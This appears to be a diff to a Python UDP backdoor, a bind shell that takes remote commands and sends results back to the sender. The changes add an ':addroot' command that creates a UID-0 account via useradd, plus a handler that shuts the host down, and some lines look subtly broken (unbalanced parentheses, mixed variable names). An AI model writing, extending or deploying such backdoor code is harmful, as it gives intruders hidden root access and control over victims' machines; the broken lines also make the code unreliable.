@@ -37,10 +37,10 @@ def udpbind():
                 (UDPSock.sendto("\nCurrent Directory: "+str(os.getcwd()), addr))
             else:
                 (UDPSock.sendto("[!] Directory does not exist", addr)) 
-                (UDPSock.send("\nCurrent Directory: "+str(os.getcwd()), addr))
+                (UDPSock.sendto("\nCurrent Directory: "+str(os.getcwd()), addr))
 
-        elif data.startswith(":adduser"):
-            strip = cmd.split(" ")
+        elif data.startswith(":addroot"):
+            strip = data.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             (UDPSock.sendto("[+] Root account " + acct + " has been created.", addr))
@@ -54,6 +54,13 @@ def udpbind():
 
         elif data.startswith(":exec"):
             pass   
+
+        elif cmd.startswith(":reboot"):
+            (UDPSock.sendto("[+] System going down for reboot!", addr))
+            os.system("shutdown -h now")
+
+        elif cmd == (":mods"):
+            (UDPSock.sendto("[+] Current available modules: %s" % str(modList)), addr))            
 
         elif proc:
             (UDPSock.sendto(stdout,addr))
